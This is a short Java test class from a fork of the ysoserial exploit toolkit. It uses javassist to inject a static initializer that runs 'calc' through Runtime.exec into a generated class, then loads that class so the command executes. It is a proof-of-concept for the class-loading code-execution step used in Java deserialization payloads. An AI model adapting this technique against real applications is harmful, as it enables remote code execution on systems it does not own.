package ysoserial;

import javassist.ClassPool;
import javassist.CtClass;
import org.mozilla.javascript.DefiningClassLoader;
import ysoserial.payloads.annotation.Authors;
import static ysoserial.payloads.annotation.Authors.R4V3ZN;

/**
 * Title: Test
 * Descrption: TODO
 * Date:2020/3/19 0:19
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 * @author R4v3zn
 * @version 1.0.0
 */
@Authors({R4V3ZN})
public class Test {

    public static byte[] generate() throws Exception {
        String code = "{java.lang.Runtime.getRuntime().exec(\"calc\");}";
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Test.class.getName());
        clazz.setName("Demo");
        clazz.makeClassInitializer().insertAfter(code);
        return clazz.toBytecode();
    }

    public static void main(String[] args) throws Exception {
        byte[] clazz = generate();
        DefiningClassLoader loader = new DefiningClassLoader();
        loader.defineClass("Demo", clazz).newInstance();
    }
}
